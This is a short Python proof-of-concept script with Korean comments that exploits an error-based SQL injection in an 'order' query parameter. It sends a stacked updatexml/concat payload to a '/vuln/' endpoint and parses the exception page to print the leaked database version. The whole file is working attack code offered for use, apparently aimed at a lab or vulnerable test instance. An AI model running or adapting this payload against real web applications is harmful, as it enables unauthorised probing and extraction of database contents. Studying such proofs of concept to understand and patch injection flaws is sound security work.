import re
import requests
import sys

# 사용자로부터 입력받은 URL의 인자 개수를 확인
if len(sys.argv) < 2:
    # 사용 방법을 출력
    print("%s url" % (sys.argv[0]))
    print("eg: python %s http://your-ip:8000/" % (sys.argv[0]))
    sys.exit()  # 인자가 부족할 경우 프로그램 종료

ip_port = sys.argv[1]
# updatexml 함수를 사용하여 XML 형식으로 반환되는 @@version 값을 선택해 데이터베이스 서버의 버전 정보를 가져옴
nxt = '/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@version)),1)%23'

url = f"http://{ip_port}{nxt}"
response = requests.get(url) 

# HTTP 응답 코드
print("Response status code:", response.status_code)

# 에러 메시지 중 버전 정보가 출력되는 부분
match = re.search(r'<pre class="exception_value">([^<]+)</pre>', response.text)
if match:
    error_message = match.group(1)
    print("Leak Version:", error_message)
else:
    print("Error message not found")

